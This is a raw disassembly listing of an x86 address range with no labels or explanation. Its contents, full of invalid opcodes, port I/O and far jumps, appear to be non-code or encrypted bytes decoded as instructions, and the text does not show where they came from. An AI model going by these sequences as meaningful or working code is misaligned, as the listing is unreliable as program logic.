  40c6bc:	or     al,0xe
  40c6be:	sub    al,0x1b
  40c6c0:	mov    ecx,0xb6280938
  40c6c5:	(bad)  [eax+0x26af32f4]
  40c6cb:	retf   0x4996
  40c6ce:	sbb    DWORD PTR [eax+0x49f782aa],edx
  40c6d4:	mov    ebx,0xa8228c77
  40c6d9:	and    eax,0x4a46df48
  40c6de:	inc    eax
  40c6df:	xchg   ecx,eax
  40c6e0:	inc    esp
  40c6e1:	mov    BYTE PTR [ebx+0x62],al
  40c6e4:	mov    eax,ds:0xdd6f893a
  40c6e9:	dec    edx
  40c6ea:	imul   edx,DWORD PTR [edi],0x76292040
  40c6f0:	stos   BYTE PTR es:[edi],al
  40c6f1:	fidivr DWORD PTR [edx]
  40c6f3:	cli    
  40c6f4:	ds mov ebp,0x4f20d716
  40c6fa:	test   DWORD PTR [edi],esp
  40c6fc:	xchg   ecx,eax
  40c6fd:	mov    ?,WORD PTR [esi-0x25]
  40c700:	in     eax,dx
  40c701:	sbb    BYTE PTR [ecx+0x7ba0d54f],al
  40c707:	ins    DWORD PTR es:[edi],dx
  40c708:	add    DWORD PTR [edi],ecx
  40c70a:	in     eax,0xdb
  40c70c:	idiv   DWORD PTR [edx-0x4f322855]
  40c712:	loopne 0x40c74e
  40c714:	bswap  esp
  40c716:	mov    ah,cl
  40c718:	pop    edx
  40c719:	sar    BYTE PTR [ecx],1
  40c71b:	and    eax,esi
  40c71d:	popf   
  40c71e:	es sub al,0xb6
  40c721:	mov    ebp,DWORD PTR [ebx+ebx*4-0x2de8a93d]
  40c728:	shl    ch,0x36
  40c72b:	bound  edx,QWORD PTR [esi]
  40c72d:	out    0xbf,al
  40c72f:	or     BYTE PTR [ecx-0x8],al
  40c732:	dec    ebx
  40c733:	and    BYTE PTR [edi+0x5c419b38],0x5d
  40c73a:	jmp    0x40c6d2
  40c73c:	les    edx,FWORD PTR [edx+0x5c]
  40c73f:	push   edx
  40c740:	pop    edi
  40c741:	dec    esi
  40c742:	push   ebx
  40c743:	enter  0x3774,0x97
  40c747:	mov    ch,0x19
  40c749:	into   
  40c74a:	inc    edx
  40c74b:	push   ebx
  40c74c:	arpl   WORD PTR [esi+eiz*1],sp
  40c74f:	cwde   
  40c750:	inc    esp
  40c751:	and    bl,dh
  40c753:	mov    esi,0xebd75d2e
  40c758:	jb     0x40c748
  40c75a:	or     al,0x33
  40c75c:	stos   BYTE PTR es:[edi],al
  40c75d:	mov    al,ds:0x935724cf
  40c762:	mov    ds:0xd03a2c6a,al
  40c767:	jp     0x40c77a
  40c769:	int3   
  40c76a:	cdq    
  40c76b:	pop    eax
  40c76c:	pop    ss
  40c76d:	push   edx
  40c76e:	cs jmp 0xf604:0x6211d322
  40c776:	mov    edx,0x946a58ff
  40c77b:	cmp    DWORD PTR [edi+0x58902468],0x6f
  40c782:	scas   eax,DWORD PTR es:[edi]
  40c783:	pop    ebx
  40c784:	and    bl,bl
  40c786:	jg     0x40c7b3
  40c788:	into   
  40c789:	add    dl,BYTE PTR [eax-0x51b14095]
  40c78f:	leave  
  40c790:	or     ch,BYTE PTR [eax]
  40c792:	les    ebx,FWORD PTR [ecx]
  40c794:	test   eax,0x2bd631d7
  40c799:	push   es
  40c79a:	xchg   ecx,eax
  40c79b:	xchg   ebp,eax
  40c79c:	sub    DWORD PTR [esi-0x3a34e02a],edx
  40c7a2:	mov    bl,0x73
  40c7a4:	arpl   sp,bx
  40c7a6:	add    esi,DWORD PTR [edx+0x78]
  40c7a9:	lds    ecx,FWORD PTR [edi+0x55]
  40c7ac:	fnstsw WORD PTR [ecx+0x4a]
  40c7af:	mov    ebx,0xbf0ddea6
  40c7b4:	xlat   BYTE PTR ds:[ebx]
  40c7b5:	xor    dh,dl
  40c7b7:	push   eax
  40c7b8:	outs   dx,DWORD PTR ds:[esi]
  40c7b9:	mov    eax,0x5debe291
  40c7be:	out    0x96,eax
  40c7c0:	jle    0x40c839
  40c7c2:	or     eax,esp
  40c7c4:	adc    ebp,edi
  40c7c6:	adc    eax,0x861eba5d
  40c7cb:	pop    eax
  40c7cc:	pusha  
  40c7cd:	test   DWORD PTR [esi-0x14779bf5],eax
  40c7d3:	sti    
  40c7d4:	push   esi
  40c7d5:	aam    0x72
  40c7d7:	and    edx,DWORD PTR [ecx]
  40c7d9:	(bad)  
  40c7da:	(bad)  
  40c7db:	push   edi
  40c7dc:	pop    edi
  40c7dd:	and    esi,DWORD PTR [ebx+0xf]
  40c7e0:	xchg   esp,eax
  40c7e1:	sub    BYTE PTR [esi+ebp*2+0x6e8d0fe8],ah
  40c7e8:	xchg   esi,eax
  40c7e9:	stos   BYTE PTR es:[edi],al
  40c7ea:	jmp    DWORD PTR [ecx]
  40c7ec:	aas    
  40c7ed:	or     eax,0x789eadda
  40c7f2:	fs inc ebp
  40c7f4:	mov    al,BYTE PTR [ebx-0x47e37dc8]
  40c7fa:	rcl    DWORD PTR [bp+si+0x4d],0x58
  40c7ff:	ret    
  40c800:	push   ds
  40c801:	mov    WORD PTR [ebp-0x5c],?
  40c804:	mov    esi,0x3625682f
  40c809:	adc    BYTE PTR [eax],0xc4
  40c80c:	mov    al,ds:0xb19ea70
  40c811:	pop    ecx
  40c812:	sub    BYTE PTR [edx],ch
  40c814:	sbb    al,0xf8
  40c816:	fidivr DWORD PTR [ebp+0x13a1f8e]
  40c81c:	pop    ss
  40c81d:	shl    DWORD PTR [ebp+ebp*4-0x5e7b051],1
  40c824:	mov    ds:0xd3cde045,al
  40c829:	je     0x40c7ee
  40c82b:	int    0xfc
  40c82d:	push   0x5ae68063
  40c832:	push   cs
  40c833:	fs test al,0x9f
  40c836:	xor    DWORD PTR [ebp+ebx*1+0x444ee479],edx
  40c83d:	jae    0x40c8a3
  40c83f:	jb     0x40c7ec
  40c841:	out    dx,al
  40c842:	aaa    
  40c843:	iret   
  40c844:	fdiv   QWORD PTR [eax-0x1e]
  40c847:	inc    esp
  40c848:	out    0x2,eax
  40c84a:	std    
  40c84b:	gs daa 
  40c84d:	add    ebx,edi
  40c84f:	ret    
  40c850:	mov    ah,0x6e
  40c852:	push   0x9
  40c854:	call   0xf55c:0x5dc049d9
  40c85b:	and    DWORD PTR [ebx-0x12],ecx
  40c85e:	fcomp  QWORD PTR cs:[esi+edi*2+0x7f527326]
  40c866:	aad    0xc7
  40c868:	adc    BYTE PTR [esp+edx*2-0x5b],0x30
  40c86d:	cli    
  40c86e:	call   0x88bf7e0e
  40c873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c874:	(bad)  [ebx-0xd2ef988]
  40c87a:	push   cs
  40c87b:	or     eax,0x549ae5ca
  40c880:	cmp    BYTE PTR [ebx+edi*8],ch
  40c883:	xchg   DWORD PTR [edi-0x58],esp
  40c886:	mov    ch,0x73
  40c888:	fwait
  40c889:	mov    ch,0x16
  40c88b:	lea    edx,[ebx+0x34]
  40c88e:	ror    DWORD PTR [edx+0x78],0x5f
  40c892:	fmul   DWORD PTR [ecx+0x21757aec]
  40c898:	cwde   
  40c899:	jnp    0x40c879
  40c89b:	adc    eax,0x99caa678
  40c8a0:	sbb    dl,BYTE PTR [edx+0x38]
  40c8a3:	xlat   BYTE PTR ds:[ebx]
  40c8a4:	jne    0x40c876
  40c8a6:	cmp    al,0x13
  40c8a8:	test   al,0x53
  40c8aa:	scas   eax,DWORD PTR es:[edi]
  40c8ab:	xchg   esp,eax
  40c8ac:	jbe    0x40c921
  40c8ae:	sub    bl,ah
  40c8b0:	(bad)  
  40c8b1:	fistp  QWORD PTR [eax+esi*4-0x5d78d402]
  40c8b8:	sbb    eax,0xe90449ee
  40c8bd:	and    al,0x93
  40c8bf:	add    ch,al
  40c8c1:	call   0x501:0xc706d68c
  40c8c8:	xor    esp,ebx
  40c8ca:	push   0xfffffff2
  40c8cc:	push   esp
  40c8cd:	xor    ch,BYTE PTR [ebx+0x4]
  40c8d0:	adc    edx,DWORD PTR [ebx]
  40c8d2:	mov    ebp,?
  40c8d4:	pop    es
  40c8d5:	sti    
  40c8d6:	leave  
  40c8d7:	push   es
  40c8d8:	xchg   esp,eax
  40c8d9:	iret   
  40c8da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8db:	out    dx,eax
  40c8dc:	cmp    ah,BYTE PTR [esp+eiz*4]
  40c8df:	popf   
  40c8e0:	fnstenv [ebx]
  40c8e2:	lds    esi,FWORD PTR [eax-0x5e2aac5f]
  40c8e8:	pushaw 
  40c8ea:	(bad)  
  40c8eb:	add    BYTE PTR [esi],bh
  40c8ed:	jbe    0x40c884
  40c8ef:	mov    BYTE PTR [eax-0x30],ch
  40c8f2:	bound  esp,QWORD PTR [edx+0x44]
  40c8f5:	test   BYTE PTR [ebp+0x77],bl
  40c8f8:	xchg   edi,eax
  40c8f9:	xchg   esp,eax
  40c8fa:	lods   eax,DWORD PTR ds:[esi]
  40c8fb:	(bad)  
  40c8fc:	or     eax,0x4e164ecf
  40c901:	cdq    
  40c902:	pop    esi
  40c903:	xor    eax,0x578e287
  40c908:	inc    edi
  40c909:	jae    0x40c96e
  40c90b:	mov    BYTE PTR [ecx+ebx*1],cl
  40c90e:	sbb    DWORD PTR [esp+ebx*8+0x1c],0xffffff9f
  40c913:	push   eax
  40c914:	add    DWORD PTR [ecx+0x5e],ecx
  40c917:	push   ds
  40c918:	lahf   
  40c919:	push   0xffffffb5
  40c91b:	pop    ss
  40c91c:	outs   dx,BYTE PTR ds:[esi]
  40c91d:	sbb    ch,dl
  40c91f:	out    dx,al
  40c920:	mov    esi,0xff3c5c06
  40c925:	test   DWORD PTR [edi-0x1488ce3c],esi
  40c92b:	mov    es,WORD PTR [edx-0x41]
  40c92e:	clc    
  40c92f:	out    0x9f,eax
  40c931:	mov    ebx,0x5778424d
  40c936:	sbb    al,0x51
  40c938:	sub    edx,esp
  40c93a:	jp     0x40c91e
  40c93c:	in     al,0x46
  40c93e:	cmp    al,0xbe
  40c940:	ins    BYTE PTR es:[edi],dx
  40c941:	pop    edi
  40c942:	inc    DWORD PTR [eax+0x55]
  40c945:	vcmppd ymm1,ymm1,ymm7,0xb2
  40c94a:	pop    esp
  40c94b:	push   edi
  40c94c:	pop    ds
  40c94d:	lods   al,BYTE PTR ds:[esi]
  40c94e:	neg    BYTE PTR [ecx-0x3937ffb9]
  40c954:	ror    DWORD PTR [esi-0x6fa2fb02],cl
  40c95a:	push   cs
  40c95b:	adc    edx,DWORD PTR [ebp+edx*4-0x64]
  40c95f:	adc    al,0x7d
  40c961:	push   ss
  40c962:	fist   DWORD PTR [ecx]
  40c964:	arpl   bx,cx
  40c966:	jl     0x40c99a
  40c968:	wrmsr  
  40c96a:	sahf   
  40c96b:	fisttp QWORD PTR [ebx+0x1ce9940c]
  40c971:	std    
  40c972:	inc    ebx
  40c973:	mov    edi,0x12ea8637
  40c978:	mov    al,ds:0xb3da4806
  40c97d:	scas   al,BYTE PTR es:[edi]
  40c97e:	aam    0x56
  40c980:	(bad)  
  40c981:	outs   dx,BYTE PTR ds:[esi]
  40c982:	mov    DWORD PTR [edx+0x38d5cba8],ebp
  40c988:	push   edx
  40c989:	aam    0x47
  40c98b:	sub    dl,bl
  40c98d:	fiadd  DWORD PTR [ebx+0x307de551]
  40c993:	jae    0x40c9a9
  40c995:	out    0xd5,al
  40c997:	jge    0x40c949
  40c999:	jg     0x40c925
  40c99b:	cwde   
  40c99c:	push   eax
  40c99d:	ja     0x40ca07
  40c99f:	ror    DWORD PTR [ecx+0x2d],1
  40c9a2:	icebp  
  40c9a3:	push   0x461031fb
  40c9a8:	pop    ecx
  40c9a9:	adc    al,0x5
  40c9ab:	(bad)  
  40c9ac:	into   
  40c9ad:	mov    edi,0xe5dd815d
  40c9b2:	pusha  
  40c9b3:	jle    0x40ca10
  40c9b5:	test   eax,0xcfa99449
  40c9ba:	mov    eax,ds:0xc54d013f
  40c9bf:	bts    eax,edx
  40c9c2:	xor    DWORD PTR [edx],edi
  40c9c4:	pop    edi
  40c9c5:	int3   
  40c9c6:	shl    BYTE PTR [edx-0x582d1100],cl
  40c9cc:	sahf   
  40c9cd:	fist   WORD PTR [edi+0x1a]
  40c9d0:	test   al,0x2c
  40c9d2:	jns    0x40c974
  40c9d4:	test   eax,0x662773a7
  40c9d9:	into   
  40c9da:	popa   
  40c9db:	aad    0x7a
  40c9dd:	(bad)  
  40c9de:	shl    BYTE PTR [eax-0x5e],1
  40c9e1:	loopne 0x40c972
  40c9e3:	jmp    0x5b75:0x2be1c99a
  40c9ea:	inc    esi
  40c9eb:	adc    eax,0xd00e0a13
  40c9f0:	leave  
  40c9f1:	js     0x40c9fd
  40c9f3:	iret   
  40c9f4:	mov    ds:0xe6519fae,eax
  40c9f9:	xchg   esi,eax
  40c9fa:	js     0x40ca77
  40c9fc:	nop
  40c9fd:	(bad)  
  40c9fe:	or     ebx,ebp
  40ca00:	data16 scas al,BYTE PTR es:[edi]
  40ca02:	shl    al,cl
  40ca04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca05:	(bad)  
  40ca06:	xchg   ebx,eax
  40ca07:	push   esp
  40ca08:	push   ecx
  40ca09:	(bad)  
  40ca0a:	sub    bh,BYTE PTR [eax+0x3e9e1f32]
  40ca10:	inc    esi
  40ca11:	adc    DWORD PTR [ebx],eax
  40ca13:	push   esp
  40ca14:	out    dx,al
  40ca15:	push   cs
  40ca16:	ss (bad) 
  40ca18:	icebp  
  40ca19:	cmc    
  40ca1a:	(bad)  
  40ca1b:	out    0xdd,eax
  40ca1d:	jo     0x40c9a8
  40ca1f:	inc    ebx
  40ca20:	int3   
  40ca21:	sbb    BYTE PTR [eax-0xadf56f],ah
  40ca27:	mov    ebx,0xc9d477bc
  40ca2c:	daa    
  40ca2d:	dec    ebp
  40ca2e:	push   esi
  40ca2f:	enter  0xdc00,0xcd
  40ca33:	jb     0x40ca78
  40ca35:	xchg   BYTE PTR [esp+ebp*1],bl
  40ca38:	cli    
  40ca39:	mov    ds:0xafaf313,al
  40ca3e:	pop    eax
  40ca3f:	nop
  40ca40:	mov    bh,0xb8
  40ca42:	icebp  
  40ca43:	imul   ebx,DWORD PTR [esi-0x4ffaf8af],0x91891170
  40ca4d:	(bad)  
  40ca4e:	sub    BYTE PTR [ebx],bh
  40ca50:	into   
  40ca51:	jns    0x40caa5
  40ca53:	test   al,0xec
  40ca55:	retf   
  40ca56:	(bad)
  40ca5a:	pushf  
  40ca5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca5c:	popa   
  40ca5d:	push   cs
  40ca5e:	and    esi,DWORD PTR [edx-0x260fc1c7]
  40ca64:	fimul  DWORD PTR [esi-0x21]
  40ca67:	shl    DWORD PTR ds:0x97beb68c,cl
  40ca6d:	xchg   esi,eax
  40ca6e:	mov    bl,0x36
  40ca70:	and    al,0x76
  40ca72:	adc    BYTE PTR [edx],bh
  40ca74:	fwait
  40ca75:	arpl   WORD PTR [edx],sp
  40ca77:	dec    esi
  40ca78:	mov    ds:0x6d83083,al
  40ca7d:	push   eax
  40ca7e:	xor    ah,BYTE PTR ds:0xaad6a9ad
  40ca84:	cmp    DWORD PTR [esi+0x73],ecx
  40ca87:	fidiv  DWORD PTR [esp]
  40ca8a:	inc    ebx
  40ca8b:	das    
  40ca8c:	and    DWORD PTR ds:0xb9e0049b,0x910e293e
  40ca96:	and    eax,0x895a0b23
  40ca9b:	sbb    al,0xf7
  40ca9d:	dec    ebp
  40ca9e:	stc    
  40ca9f:	mov    bh,0xa
  40caa1:	mov    BYTE PTR ds:0xba30146c,dh
  40caa7:	mov    ds:0xdb37e291,eax
  40caac:	lahf   
  40caad:	push   esp
  40caae:	xchg   ebx,edx
  40cab0:	mov    esi,0x6f2825ba
  40cab5:	mov    dl,0xf1
  40cab7:	test   BYTE PTR [eax-0x6d],dh
  40caba:	and    al,0x31
  40cabc:	sbb    bl,BYTE PTR [edx+0x5]
  40cabf:	push   ecx
  40cac0:	cld    
  40cac1:	jno    0x40cae6
  40cac3:	pop    esp
  40cac4:	sub    BYTE PTR [edi+0x50],bl
  40cac7:	xor    al,0x9e
  40cac9:	push   ebx
  40caca:	cli    
  40cacb:	mov    bl,0xf0
  40cacd:	push   edi
  40cace:	and    al,0x55
  40cad0:	aam    0xbd
  40cad2:	push   eax
  40cad3:	test   eax,0x90dda42a
  40cad8:	pop    edi
  40cad9:	mov    ecx,DWORD PTR [edi+0x43]
  40cadc:	inc    edx
  40cadd:	leave  
  40cade:	xchg   ecx,eax
  40cadf:	pmulhw mm0,mm6
  40cae2:	popa   
  40cae3:	jge    0x40cac8
  40cae5:	xchg   edx,eax
  40cae6:	lds    eax,FWORD PTR [esi-0x36b8588f]
  40caec:	mov    ds:0xaeeee3bd,eax
  40caf1:	jp     0x40cb27
  40caf3:	test   al,0xb3
  40caf5:	out    0x19,al
  40caf7:	pushf  
  40caf8:	(bad)  
  40caf9:	jns    0x40cb01
  40cafb:	stc    
  40cafc:	sbb    esp,DWORD PTR [ebp+0x4f]
  40caff:	nop
  40cb00:	rcr    ebx,0x14
  40cb03:	and    cl,bh
  40cb05:	adc    bl,BYTE PTR [esi-0x544aa592]
  40cb0b:	sbb    esp,edx
  40cb0d:	add    ebp,ecx
  40cb0f:	mov    al,0xc7
  40cb11:	and    DWORD PTR [ecx+0x782d36a1],esi
  40cb17:	bound  ebx,QWORD PTR cs:[edx+0x4b122fbb]
  40cb1e:	dec    ecx
  40cb1f:	ins    DWORD PTR es:[edi],dx
  40cb20:	add    eax,0x62bda9cf
  40cb25:	push   ebp
  40cb26:	popf   
  40cb27:	jns    0x40cb81
  40cb29:	mov    edx,0x334c6ea3
  40cb2e:	or     BYTE PTR [eax+0x43],0xb3
  40cb32:	xor    eax,DWORD PTR [esi+0x76]
  40cb35:	push   eax
  40cb36:	jbe    0x40cb9c
  40cb38:	lahf   
  40cb39:	fwait
  40cb3a:	jecxz  0x40cb1a
  40cb3c:	mov    ds:0xa7574f72,eax
  40cb41:	push   edi
  40cb42:	fiadd  DWORD PTR [esi-0x72]
  40cb45:	ins    DWORD PTR es:[edi],dx
  40cb46:	aaa    
  40cb47:	fisttp DWORD PTR [eax-0xb4dc23d]
  40cb4d:	ror    DWORD PTR [eax+ebx*4-0x6102f9b],0x81
  40cb55:	dec    esi
  40cb56:	jl     0x40caff
  40cb58:	push   esi
  40cb59:	ret    
  40cb5a:	mov    ebp,0xf5c7f7f
  40cb5f:	cs loop 0x40cb10
  40cb62:	sub    DWORD PTR [ebx+0x72],edx
  40cb65:	mov    dh,0xa0
  40cb67:	mov    dl,0x4f
  40cb69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb6a:	mov    edx,0xcffd45c9
  40cb6f:	adc    al,0x46
  40cb71:	fstp   st(4)
  40cb73:	stos   DWORD PTR es:[edi],eax
  40cb74:	mov    edx,0x120a3901
  40cb79:	int3   
  40cb7a:	ins    DWORD PTR es:[edi],dx
  40cb7b:	loopne 0x40cbe0
  40cb7d:	(bad)
  40cb80:	dec    esp
  40cb81:	xlat   BYTE PTR ds:[ebx]
  40cb82:	ret    
  40cb83:	push   DWORD PTR [edx-0x73]
  40cb86:	xor    bh,BYTE PTR [edi-0x28]
  40cb89:	jo     0x40cc01
  40cb8b:	imul   edi,edi,0x2f6ed990
  40cb91:	push   ss
  40cb92:	cld    
  40cb93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb94:	mov    ecx,0x469fab41
  40cb99:	mov    bl,0x5c
  40cb9b:	or     BYTE PTR ds:0xe98ea4bb,0xa5
  40cba2:	mov    cl,BYTE PTR [ebp+0x2ea9257f]
  40cba8:	je     0x40cc01
  40cbaa:	pushf  
  40cbab:	push   edi
  40cbac:	mov    ebp,0x2afd87c0
  40cbb1:	jmp    0x40cbef
  40cbb3:	or     eax,0xa2bd830
  40cbb8:	inc    ecx
  40cbb9:	fcom   st(5)
  40cbbb:	or     bl,bh
  40cbbd:	inc    ecx
  40cbbe:	mov    ds:0x8b071b1c,eax
  40cbc3:	ins    DWORD PTR es:[edi],dx
  40cbc4:	lahf   
  40cbc5:	push   ebx
  40cbc6:	add    dl,BYTE PTR [eax-0xb5d5172]
  40cbcc:	xor    eax,0x6436af7b
  40cbd1:	mov    esp,0x12ef472d
  40cbd6:	loopne 0x40cbb3
  40cbd8:	mov    ds:0xfa3ea5e,eax
  40cbdd:	mov    bl,0xb8
  40cbdf:	lock loop 0x40cc22
  40cbe2:	adc    al,0xaf
  40cbe4:	stos   BYTE PTR es:[edi],al
  40cbe5:	mov    ds:0x7d300106,al
  40cbea:	sbb    al,0x5c
  40cbec:	push   es
  40cbed:	mov    ebx,0x7313bca6
  40cbf2:	pop    ss
  40cbf3:	inc    esi
  40cbf4:	mov    esi,DWORD PTR [ecx-0xd]
  40cbf7:	pushf  
  40cbf8:	loop   0x40cb8b
  40cbfa:	sbb    dh,BYTE PTR [eax+0x7c02f488]
  40cc00:	mov    ebp,0xd1be2359
  40cc05:	mov    al,0xbd
  40cc07:	stos   BYTE PTR es:[edi],al
  40cc08:	mov    edi,0xeaef387c
  40cc0d:	jo     0x40cbff
  40cc0f:	push   es
  40cc10:	and    esi,ecx
  40cc12:	data16 fnstsw WORD PTR cs:[edi+0x66707a08]
  40cc1a:	addr16 pop eax
  40cc1c:	inc    esi
  40cc1d:	test   BYTE PTR [esi+eax*4],cl
  40cc20:	mov    BYTE PTR [ebp-0x11],cl
  40cc23:	add    BYTE PTR [ebx+0x495846cc],bh
  40cc29:	push   es
  40cc2a:	retf   0x392f
  40cc2d:	ret    0x95d7
  40cc30:	or     BYTE PTR ds:0xf7d91e2,ch
  40cc36:	dec    ebx
  40cc37:	dec    ebp
  40cc38:	or     eax,0x46e53ac1
  40cc3d:	cmc    
  40cc3e:	sbb    BYTE PTR [ecx+0x1dad7945],0x2a
  40cc45:	sub    esi,DWORD PTR [ebx+0x7dc241bb]
  40cc4b:	ret    
  40cc4c:	inc    ebx
  40cc4d:	in     eax,0xc8
  40cc4f:	fucomp st(6)
  40cc51:	pop    ds
  40cc52:	push   ebp
  40cc53:	mov    dh,0xc6
  40cc55:	and    BYTE PTR [eax-0x71],0x76
  40cc59:	ret    
  40cc5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc5b:	mov    ebp,0xf37722b5
  40cc60:	jne    0x40cbea
  40cc62:	push   edi
  40cc63:	lea    ecx,[ecx+0xe]
  40cc66:	stos   BYTE PTR es:[edi],al
  40cc67:	lahf   
  40cc68:	push   edi
  40cc69:	outs   dx,BYTE PTR ds:[esi]
  40cc6a:	shr    BYTE PTR [ebp+0x3d],0x34
  40cc6e:	push   0x66
  40cc70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc71:	in     al,dx
  40cc72:	dec    BYTE PTR [ebp-0x240711c4]
  40cc78:	fwait
  40cc79:	mov    esi,0x290bebb9
  40cc7e:	ret    0xcba6
  40cc81:	sti    
  40cc82:	and    cl,BYTE PTR [eax+0x11]
  40cc85:	(bad)  
  40cc86:	mov    BYTE PTR [ebx-0x3f],al
  40cc89:	fwait
  40cc8a:	mov    edx,0x58574df0
  40cc8f:	pop    ss
  40cc90:	ja     0x40ccc5
  40cc92:	dec    BYTE PTR [ecx]
  40cc94:	fldenv [edi]
  40cc96:	pop    ecx
  40cc97:	imul   edx,DWORD PTR [ebp-0x4f257b4d],0xffffffc0
  40cc9e:	std    
  40cc9f:	aas    
  40cca0:	and    cl,bl
  40cca2:	int3   
  40cca3:	ret    
  40cca4:	jl     0x40cce3
  40cca6:	stos   BYTE PTR es:[edi],al
  40cca7:	push   0x17361d1b
  40ccac:	std    
  40ccad:	popa   
  40ccae:	adc    eax,0x7b67aa4a
  40ccb3:	pop    es
  40ccb4:	jbe    0x40ccb8
  40ccb6:	fbstp  TBYTE PTR [edx]
  40ccb8:	test   DWORD PTR [edx+0x4a393808],esi
  40ccbe:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccc0:	xor    BYTE PTR [eax-0x65],bl
  40ccc3:	scas   eax,DWORD PTR es:[edi]
  40ccc4:	scas   al,BYTE PTR es:[edi]
  40ccc5:	sbb    al,0x21
  40ccc7:	mov    ecx,0xcba167c9
  40cccc:	clc    
  40cccd:	or     ch,bh
  40cccf:	(bad)  
  40ccd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccd1:	or     cl,dh
  40ccd3:	adc    eax,0x6a32b2f9
  40ccd8:	sbb    BYTE PTR ds:0xbc411e91,dl
  40ccde:	lods   al,BYTE PTR ds:[esi]
  40ccdf:	add    BYTE PTR [edi],bh
  40cce1:	pop    es
  40cce2:	sub    DWORD PTR [esi],edi
  40cce4:	cmp    esi,edx
  40cce6:	fadd   DWORD PTR [edx+0x3d]
  40cce9:	inc    esi
  40ccea:	mov    edi,0xe713e829
  40ccef:	adc    al,0x6c
  40ccf1:	dec    ecx
  40ccf2:	dec    ebp
  40ccf3:	dec    ebp
  40ccf4:	sbb    ah,BYTE PTR [ecx]
  40ccf6:	sub    eax,0x6e0ead3f
  40ccfb:	cmp    DWORD PTR [eax-0x1f],edx
  40ccfe:	xor    dh,dl
  40cd00:	jmp    0xddf0:0xf4ec813
  40cd07:	xchg   edx,eax
  40cd08:	xchg   esp,eax
  40cd09:	mov    al,0x8
  40cd0b:	add    al,0x73
  40cd0d:	jae    0x40cd1b
  40cd0f:	rcr    BYTE PTR [esp+eax*1-0x64],cl
  40cd13:	inc    ebp
  40cd14:	fwait
  40cd15:	jmp    0x74de855b
  40cd1a:	pop    ecx
  40cd1b:	outs   dx,DWORD PTR ds:[esi]
  40cd1c:	sbb    BYTE PTR [edx+ebp*4+0x2a5aa5d6],ch
  40cd23:	popa   
  40cd24:	mov    al,BYTE PTR [ecx-0x7924a95e]
  40cd2a:	dec    esi
  40cd2b:	mov    dl,0x38
  40cd2d:	aad    0xe2
  40cd2f:	mov    bl,0xa6
  40cd31:	ss in  al,0x92
  40cd34:	or     BYTE PTR [edi+0x57fa0e67],0x84
  40cd3b:	ja     0x40cda3
  40cd3d:	jae    0x40cd40
  40cd3f:	sub    ebp,DWORD PTR [eax+0x688b72f7]
  40cd45:	mov    dh,0x41
  40cd47:	int3   
  40cd48:	push   ebp
  40cd49:	clc    
  40cd4a:	sbb    esi,DWORD PTR [edi+0x2ad7f28b]
  40cd50:	pop    esi
  40cd51:	mov    esp,DWORD PTR [edi-0x764edf21]
  40cd57:	loop   0x40cd94
  40cd59:	(bad)  
  40cd5a:	xor    DWORD PTR [edx],ebp
  40cd5c:	mov    esi,0xd838371b
  40cd61:	jo     0x40cce6
  40cd63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd64:	fwait
  40cd65:	pop    ss
  40cd66:	rcr    al,cl
  40cd68:	cmp    eax,0xb3ac5cc8
  40cd6d:	cmp    al,0x11
  40cd6f:	pop    es
  40cd70:	ins    DWORD PTR es:[edi],dx
  40cd71:	aam    0x1
  40cd73:	pop    esi
  40cd74:	pop    edi
  40cd75:	mov    dl,BYTE PTR [edi+ebx*8+0x36]
  40cd79:	inc    ebx
  40cd7a:	mov    al,0x26
  40cd7c:	pop    DWORD PTR [ebp+0x66]
  40cd7f:	pop    esp
  40cd80:	inc    eax
  40cd81:	loopne 0x40cdf8
  40cd83:	fidiv  DWORD PTR [ecx+0x2b099e62]
  40cd8a:	adc    DWORD PTR [ebp-0x7],ebx
  40cd8d:	dec    esi
  40cd8e:	mov    ah,0x9b
  40cd90:	in     eax,0xec
  40cd92:	xor    dl,BYTE PTR [edi+0x30]
  40cd95:	nop
  40cd96:	pop    esp
  40cd97:	das    
  40cd98:	adc    ah,bh
  40cd9a:	mov    cs,WORD PTR [ecx+0x22]
  40cd9d:	pusha  
  40cd9e:	in     eax,dx
  40cd9f:	ins    DWORD PTR es:[edi],dx
  40cda0:	xchg   ebp,eax
  40cda1:	push   esp
  40cda2:	xor    eax,0x18c674d7
  40cda7:	mov    ebx,DWORD PTR [ebp+ebx*8-0x1631ca8]
  40cdae:	mov    ds:0x4218aed3,eax
  40cdb3:	inc    esi
  40cdb4:	test   DWORD PTR [eax+eiz*1-0x51a4bac3],0x82c0515b
  40cdbf:	mov    esp,0xf93d14a
  40cdc4:	xor    ah,BYTE PTR [ebx-0x4baeaa3]
  40cdca:	loope  0x40cd8c
  40cdcc:	mov    gs,esi
  40cdce:	adc    dl,BYTE PTR [edx-0x1c3f053]
  40cdd4:	jle    0x40cdbe
  40cdd6:	mov    ebx,0x7534d2a4
  40cddb:	jns    0x40cdae
  40cddd:	adc    BYTE PTR [edi-0x1a4ef55e],bh
  40cde3:	jno    0x40ce32
  40cde5:	ss xor ebx,edx
  40cde8:	js     0x40ce52
  40cdea:	lods   al,BYTE PTR ds:[esi]
  40cdeb:	jle    0x40ce56
  40cded:	or     al,0xa8
  40cdef:	dec    ebx
  40cdf0:	xchg   esp,eax
  40cdf1:	fadd   DWORD PTR [edi]
  40cdf3:	sbb    ebp,DWORD PTR [edx-0x6b1db5ca]
  40cdf9:	xor    eax,0x96b7985c
  40cdfe:	pop    eax
  40cdff:	(bad)  
  40ce00:	mov    dl,0x8a
  40ce02:	pop    ebx
  40ce03:	rcl    BYTE PTR [ebx],cl
  40ce05:	pushf  
  40ce06:	add    DWORD PTR [ebx-0x52],0x2
  40ce0a:	out    0xf1,al
  40ce0c:	lods   eax,DWORD PTR ds:[esi]
  40ce0d:	test   bh,dl
  40ce0f:	mov    eax,0x18a960a2
  40ce14:	push   cs
  40ce15:	pop    ebx
  40ce16:	xchg   edi,eax
  40ce17:	push   ds
  40ce18:	fwait
  40ce19:	loope  0x40cdbd
  40ce1b:	int3   
